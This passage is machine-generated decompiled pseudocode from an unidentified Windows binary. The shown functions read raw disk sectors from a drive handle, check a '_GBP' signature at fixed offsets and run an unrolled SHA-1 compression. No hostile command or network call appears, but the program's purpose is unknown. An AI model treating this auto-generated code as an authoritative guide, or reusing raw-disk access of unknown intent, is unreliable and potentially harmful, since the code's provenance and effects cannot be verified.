      if ((iVar5 <= iVar1) && ((iVar5 < iVar1 || (uVar3 < *(uint *)((int)lpOutBuffer + 0x1e8))))) {
        uVar4 = *(uint *)((int)lpOutBuffer + 0x1f0);
        local_18 = *(int *)((int)lpOutBuffer + 500);
        uVar3 = *(uint *)((int)lpOutBuffer + 0x1e8);
        iVar5 = iVar1;
      }
      uVar6 = __alldiv(uVar4 + uVar3,local_18 + iVar5 + (uint)CARRY4(uVar4,uVar3),0x200,0);
      local_8 = (undefined4)uVar6;
    }
    if (lpOutBuffer != (void *)0x0) {
      FUN_0040a83e(lpOutBuffer);
    }
  }
  Sleep(100);
  return local_8;
}



void __fastcall FUN_00403c20(undefined4 param_1,wchar_t *param_2,wchar_t *param_3)

{
  _vswprintf_s(param_2,0x14,param_3,&stack0x00000008);
  return;
}



undefined4 __cdecl FUN_00403c40(undefined4 *param_1)

{
  short sVar1;
  HANDLE in_EAX;
  undefined4 *_Dst;
  uint uVar2;
  BOOL BVar3;
  short *psVar4;
  int iVar5;
  undefined4 *puVar6;
  _OVERLAPPED local_20;
  DWORD local_c;
  undefined4 local_8;
  
  local_8 = 0;
  if (in_EAX == (HANDLE)0xffffffff) {
    return 0;
  }
  _Dst = (undefined4 *)operator_new(0x400);
  _memset(_Dst,0,0x400);
  uVar2 = FUN_00403ae0(in_EAX);
  local_20.InternalHigh = 0;
  local_20.hEvent = (HANDLE)0x0;
  local_20.u.s.OffsetHigh = uVar2 >> 0x17;
  local_20.u.s.Offset = uVar2 << 9;
  local_20.Internal = 0;
  local_c = 0;
  BVar3 = ReadFile(in_EAX,_Dst,0x400,&local_c,&local_20);
  if (BVar3 == 0) goto LAB_00403d58;
  if (_Dst[1] == 0x5042475f) {
    psVar4 = (short *)((int)_Dst + 0x10e);
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 == 0) goto LAB_00403ce3;
  }
  else {
LAB_00403ce3:
    local_20.InternalHigh = 0;
    local_20.hEvent = (HANDLE)0x0;
    local_20.Internal = 0;
    local_c = 0;
    local_20.u.s.Offset = 0x3c00;
    local_20.u.s.OffsetHigh = 0;
    BVar3 = ReadFile(in_EAX,_Dst,0x400,&local_c,&local_20);
    if ((BVar3 == 0) || (_Dst[1] != 0x5042475f)) goto LAB_00403d58;
    psVar4 = (short *)((int)_Dst + 0x10e);
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 == 0) goto LAB_00403d58;
  }
  puVar6 = _Dst;
  for (iVar5 = 0x8d; iVar5 != 0; iVar5 = iVar5 + -1) {
    *param_1 = *puVar6;
    puVar6 = puVar6 + 1;
    param_1 = param_1 + 1;
  }
  *(undefined2 *)param_1 = *(undefined2 *)puVar6;
  local_8 = 1;
LAB_00403d58:
  if (_Dst != (undefined4 *)0x0) {
    FUN_0040a83e(_Dst);
  }
  return local_8;
}



void FUN_00403d70(void)

{
  int iVar1;
  undefined4 *unaff_ESI;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  GetSystemDirectoryW(&local_214,0x104);
  FUN_004039f0(local_214 + L'���');
  iVar1 = FUN_00403940();
  if (iVar1 == -1) {
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  FUN_00403c40(unaff_ESI);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403e10(void)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar7 = *(uint *)(in_EAX + 8);
  uVar8 = *(uint *)(in_EAX + 0xc);
  uVar4 = uVar8 >> 2 | uVar8 << 0x1e;
  uVar8 = (uVar7 >> 0x1b | uVar7 << 5) +
          ((*(uint *)(in_EAX + 0x14) ^ *(uint *)(in_EAX + 0x10)) & uVar8 ^ *(uint *)(in_EAX + 0x14))
          + *(int *)(in_EAX + 0x18) + 0x5a827999 + *(int *)(in_EAX + 0x1c);
  uVar6 = *(int *)(in_EAX + 0x14) + 0x5a827999 +
          ((*(uint *)(in_EAX + 0x10) ^ uVar4) & uVar7 ^ *(uint *)(in_EAX + 0x10)) +
          (uVar8 >> 0x1b | uVar8 * 0x20) + *(int *)(in_EAX + 0x20);
  uVar1 = uVar7 >> 2 | uVar7 << 0x1e;
  uVar7 = *(int *)(in_EAX + 0x10) + 0x5a827999 +
          ((uVar4 ^ uVar1) & uVar8 ^ uVar4) +
          (uVar6 >> 0x1b | uVar6 * 0x20) + *(int *)(in_EAX + 0x24);
  uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar4 + 0x5a827999 +
          ((uVar2 ^ uVar1) & uVar6 ^ uVar1) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x28);
  uVar4 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 + 0x5a827999 +
          ((uVar2 ^ uVar4) & uVar7 ^ uVar2) +
          (uVar8 >> 0x1b | uVar8 * 0x20) + *(int *)(in_EAX + 0x2c);
  uVar1 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar2 + 0x5a827999 +
          ((uVar4 ^ uVar1) & uVar8 ^ uVar4) +
          (uVar6 >> 0x1b | uVar6 * 0x20) + *(int *)(in_EAX + 0x30);
  uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar4 + 0x5a827999 +
          ((uVar1 ^ uVar2) & uVar6 ^ uVar1) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x34);
  uVar4 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 + 0x5a827999 +
          ((uVar2 ^ uVar4) & uVar7 ^ uVar2) +
          (uVar8 >> 0x1b | uVar8 * 0x20) + *(int *)(in_EAX + 0x38);
  uVar1 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar2 + 0x5a827999 +
          ((uVar1 ^ uVar4) & uVar8 ^ uVar4) +
          (uVar6 >> 0x1b | uVar6 * 0x20) + *(int *)(in_EAX + 0x3c);
  uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar4 + 0x5a827999 +
          ((uVar1 ^ uVar2) & uVar6 ^ uVar1) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x40);
  uVar4 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 + 0x5a827999 +
          ((uVar2 ^ uVar4) & uVar7 ^ uVar2) +
          (uVar8 >> 0x1b | uVar8 * 0x20) + *(int *)(in_EAX + 0x44);
  uVar1 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar2 + 0x5a827999 +
          ((uVar4 ^ uVar1) & uVar8 ^ uVar4) +
          (uVar6 >> 0x1b | uVar6 * 0x20) + *(int *)(in_EAX + 0x48);
  uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar4 + 0x5a827999 +
          ((uVar1 ^ uVar2) & uVar6 ^ uVar1) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x4c);
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 + 0x5a827999 +
          ((uVar5 ^ uVar2) & uVar7 ^ uVar2) +
          (uVar8 >> 0x1b | uVar8 * 0x20) + *(int *)(in_EAX + 0x50);
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x54);
  uVar7 = uVar2 + 0x5a827999 +
          ((uVar5 ^ uVar4) & uVar8 ^ uVar5) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar1;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58);
  uVar8 = uVar5 + 0x5a827999 +
          ((uVar4 ^ uVar3) & uVar6 ^ uVar4) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar2;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar6;
  uVar6 = uVar4 + 0x5a827999 +
          ((uVar3 ^ uVar5) & uVar7 ^ uVar3) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar1 ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x28) ^ *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x20) = uVar7;
  uVar7 = uVar3 + 0x5a827999 +
          ((uVar5 ^ uVar4) & uVar8 ^ uVar5) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar2 ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^ *(uint *)(in_EAX + 0x24);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x24) = uVar8;
  uVar8 = uVar5 + 0x5a827999 +
          ((uVar3 ^ uVar4) & uVar6 ^ uVar4) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x28) = uVar6;
  uVar6 = uVar4 + 0x5a827999 +
          ((uVar3 ^ uVar5) & uVar7 ^ uVar3) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar7 = uVar3 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar8) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x30) = uVar8;
  uVar8 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar6) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x28);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x34) = uVar6;
  uVar6 = uVar4 + 0x6ed9eba1 + (uVar7 ^ uVar3 ^ uVar5) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar2 ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x2c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x38) = uVar7;
  uVar7 = uVar3 + 0x6ed9eba1 + (uVar4 ^ uVar8 ^ uVar5) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x1c);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar8;
  uVar8 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar6) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x40) = uVar6;
  uVar6 = uVar4 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar7) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar7 = uVar3 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar8) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x48) = uVar8;
  uVar8 = uVar5 + 0x6ed9eba1 + (uVar6 ^ uVar4 ^ uVar3) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar6;
  uVar1 = uVar1 ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar4 + 0x6ed9eba1 + (uVar5 ^ uVar7 ^ uVar3) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar2 ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x30);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar7;
  uVar7 = uVar3 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar8) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar9 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x54) = uVar8;
  uVar1 = uVar2 ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x20);
  uVar8 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar9 ^ uVar6) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x58) = uVar6;
  uVar3 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar6 = uVar4 + 0x6ed9eba1 + (uVar9 ^ uVar2 ^ uVar7) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar7 = uVar9 + 0x6ed9eba1 + (uVar8 ^ uVar2 ^ uVar3) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar1;
  uVar5 = uVar8 >> 2 | uVar8 * 0x40000000;
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = *(uint *)(in_EAX + 0x54);
  uVar8 = uVar1 ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x28) ^ *(uint *)(in_EAX + 0x20);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x20) = uVar8;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar8 = uVar2 + 0x6ed9eba1 + (uVar5 ^ uVar6 ^ uVar3) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  *(uint *)(in_EAX + 0x24) = uVar6;
  uVar6 = uVar3 + 0x6ed9eba1 + (uVar5 ^ uVar2 ^ uVar7) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar7;
  uVar7 = uVar5 + 0x6ed9eba1 + (uVar2 ^ uVar4 ^ uVar8) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar8;
  uVar8 = uVar2 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar6) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x30) = uVar6;
  uVar6 = uVar4 + 0x6ed9eba1 + (uVar7 ^ uVar3 ^ uVar2) + (uVar8 >> 0x1b | uVar8 * 0x20) + uVar6;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar1 ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x28);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x34) = uVar7;
  uVar7 = uVar3 + 0x6ed9eba1 + (uVar4 ^ uVar8 ^ uVar2) + (uVar6 >> 0x1b | uVar6 * 0x20) + uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  *(uint *)(in_EAX + 0x38) = uVar8;
  uVar8 = uVar2 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar6) + (uVar7 >> 0x1b | uVar7 * 0x20) + uVar8;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar6;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar6 = ((uVar5 ^ uVar7) & uVar3 | uVar5 & uVar7) + uVar6 + uVar4 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar7;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar2 ^ uVar8) & uVar5 | uVar2 & uVar8) + uVar7 + uVar3 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar3 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar9 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = ((uVar6 ^ uVar4) & uVar2 | uVar6 & uVar4) + uVar7 + uVar5 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x48) = uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar9 ^ uVar8) & uVar4 | uVar9 & uVar8) + uVar7 + uVar2 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = uVar1 ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x2c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar7;
  uVar1 = uVar1 ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x1c);
  uVar7 = ((uVar3 ^ uVar6) & uVar9 | uVar3 & uVar6) + uVar7 + uVar4 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar4 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x30);
  uVar2 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x50) = uVar2;
  uVar5 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar6 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar8 = ((uVar4 ^ uVar8) & uVar3 | uVar4 & uVar8) + uVar2 + uVar9 + -0x70e44324 +
          (uVar7 >> 0x1b | uVar7 * 0x20);
  *(uint *)(in_EAX + 0x54) = uVar6;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar6 = ((uVar5 ^ uVar7) & uVar4 | uVar5 & uVar7) + uVar6 + uVar3 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar8 ^ uVar2) & uVar5 | uVar8 & uVar2) + uVar7 + uVar4 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar7 = ((uVar3 ^ uVar6) & uVar2 | uVar3 & uVar6) + uVar1 + uVar5 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = *(uint *)(in_EAX + 0x54);
  uVar6 = uVar1 ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x28) ^ *(uint *)(in_EAX + 0x20);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x20) = uVar6;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar8 = ((uVar5 ^ uVar8) & uVar3 | uVar5 & uVar8) + uVar6 + uVar2 + -0x70e44324 +
          (uVar7 >> 0x1b | uVar7 * 0x20);
  *(uint *)(in_EAX + 0x24) = uVar4;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar6 = ((uVar9 ^ uVar7) & uVar5 | uVar9 & uVar7) + uVar4 + uVar3 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar7;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar2 ^ uVar8) & uVar9 | uVar2 & uVar8) + uVar7 + uVar5 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar3 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = ((uVar6 ^ uVar4) & uVar2 | uVar6 & uVar4) + uVar7 + uVar9 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x30) = uVar6;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar5 ^ uVar8) & uVar4 | uVar5 & uVar8) + uVar6 + uVar2 + -0x70e44324 +
          (uVar7 >> 0x1b | uVar7 * 0x20);
  uVar6 = uVar1 ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x28);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x34) = uVar6;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar6 = ((uVar3 ^ uVar7) & uVar5 | uVar3 & uVar7) + uVar6 + uVar4 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x38) = uVar7;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar2 ^ uVar8) & uVar3 | uVar2 & uVar8) + uVar7 + uVar5 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
